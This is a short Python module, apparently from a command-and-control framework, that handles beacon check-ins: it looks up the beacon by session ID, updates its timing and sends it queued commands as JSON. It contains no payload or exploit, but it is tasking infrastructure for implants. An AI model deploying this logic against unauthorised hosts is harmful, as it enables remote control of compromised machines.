
import time
import json
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler

from Modules.global_objects import beacon_list, command_list, logger
from Modules.beacon.beacon_server.socket_manager import socketio


def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
    """Handles periodic beacon check-ins for new commands."""
    logger.info(f"Beacon call-in from {handler.path}")

    query_components = parse_qs(urlparse(handler.path).query)
    beacon_id = query_components.get('session', [None])[0]

    if not beacon_id:
        logger.error("No session ID provided in beacon call-in.")
        handler.send_response(400)
        handler.end_headers()
        return

    beacon = beacon_list.get(beacon_id)
    if not beacon:
        logger.error(f"Beacon with ID {beacon_id} not found.")
        handler.send_response(404)
        handler.end_headers()
        return

    # Update beacon timestamps and notify UI
    beacon.last_beacon = time.asctime()
    beacon.next_beacon = time.asctime(time.localtime(time.time() + beacon.timer))
    logger.info(f"Beacon {beacon_id} updated. Next check-in: {beacon.next_beacon}")

    # Check for commands to send
    commands_to_send = []
    for cmd_id, command in command_list.items():
        if command.beacon_uuid == beacon_id and not command.executed:
            command.output = "Sent to beacon, waiting for response."
            commands_to_send.append({
                "command_uuid": cmd_id,
                "command": command.command,
                "data": command.command_data
            })
            command.executed = True
        if command.command == "module":
            command.command_data = None 
          

    response_data = {"commands": commands_to_send} if commands_to_send else {"none": "none"}
    response_body = json.dumps(response_data).encode('utf-8')

    handler.send_response(200)
    handler.send_header('Content-Type', 'application/json')
    handler.send_header('Content-Length', str(len(response_body)))
    handler.end_headers()
    handler.wfile.write(response_body)
